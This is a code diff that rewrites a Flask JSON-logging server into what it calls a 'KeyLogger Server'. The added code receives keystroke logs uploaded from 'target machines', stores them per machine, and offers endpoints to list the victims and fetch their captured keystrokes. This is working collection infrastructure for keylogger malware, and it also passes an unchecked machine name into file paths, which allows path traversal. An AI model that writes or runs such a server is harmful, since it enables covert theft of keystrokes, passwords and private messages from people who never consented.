@@ -1,51 +1,59 @@
-import os
-import json
 from flask import Flask, request, jsonify
-from datetime import datetime
+import os, time
 
-# יוצר מופע של יישום Flask
 app = Flask(__name__)
+DATA_FOLDER = "data"
+os.makedirs(DATA_FOLDER, exist_ok=True)
 
-# הגדרת נתיב לשמירת קבצי היומן
-LOG_DIR = 'server_logs'
-if not os.path.exists(LOG_DIR):
-    os.makedirs(LOG_DIR)
+@app.route('/')
+def home():
+    return "KeyLogger Server is Running"
 
+def generate_log_filename():
+    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
 
 @app.route('/api/upload', methods=['POST'])
-def save_data():
-    """
-    מקבל בקשת POST עם נתוני JSON, שומר אותם לקובץ JSON
-    ומחזיר תגובה.
-    """
-    # בדוק אם הבקשה מכילה נתוני JSON
-    if not request.is_json:
-        return jsonify({"error": "Request must be JSON"}), 400
+def upload():
+    data = request.get_json()
+    if not data or "machine" not in data or "data" not in data:
+        return jsonify({"error": "Invalid payload"}), 400
 
-    # קבל את הנתונים מהבקשה
-    data_to_save = request.get_json()
+    machine = data["machine"]
+    log_data = data["data"]
 
-    # יצירת שם קובץ ייחודי עם חותמת זמן
-    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-    filename = f"data_{timestamp}.json"
-    file_path = os.path.join(LOG_DIR, filename)
+    machine_folder = os.path.join(DATA_FOLDER, machine)
+    os.makedirs(machine_folder, exist_ok=True)
 
-    try:
-        # שמירת הנתונים לקובץ JSON
-        with open(file_path, 'w', encoding='utf-8') as f:
-            # המר את מילון הפייתון למחרוזת JSON
-            json.dump(data_to_save, f, indent=4, ensure_ascii=False)
+    filename = generate_log_filename()
+    file_path = os.path.join(machine_folder, filename)
 
-        # שלח תגובה חזרה למשתמש
-        print(f"נתונים נשמרו בהצלחה לקובץ: {file_path}")
-        return jsonify({"message": "Data saved successfully", "filename": filename}), 200
+    with open(file_path, "w", encoding="utf-8") as f:
+        f.write(log_data)
 
-    except Exception as e:
-        # טיפול בשגיאות ושליחת הודעת שגיאה
-        print(f"שגיאה בשמירת הנתונים: {e}")
-        return jsonify({"error": "Failed to save data", "details": str(e)}), 500
+    return jsonify({"status": "success", "file": file_path}), 200
 
+@app.route('/api/get_target_machines_list', methods=['GET'])
+def get_machines():
+    machines = os.listdir(DATA_FOLDER)
+    return jsonify(machines)
 
-# מריץ את השרת רק אם הקובץ מופעל ישירות
+@app.route('/api/get_keystrokes', methods=['GET'])
+def get_keystrokes():
+    machine = request.args.get("machine")
+    if not machine:
+        return jsonify({"error": "Missing machine"}), 400
+
+    machine_folder = os.path.join(DATA_FOLDER, machine)
+    if not os.path.exists(machine_folder):
+        return jsonify([])
+
+    files = sorted(os.listdir(machine_folder))
+    data = []
+    for file in files:
+        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
+            data.append(f.read())
+
+    return jsonify(data)
+
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    app.run(debug=True)
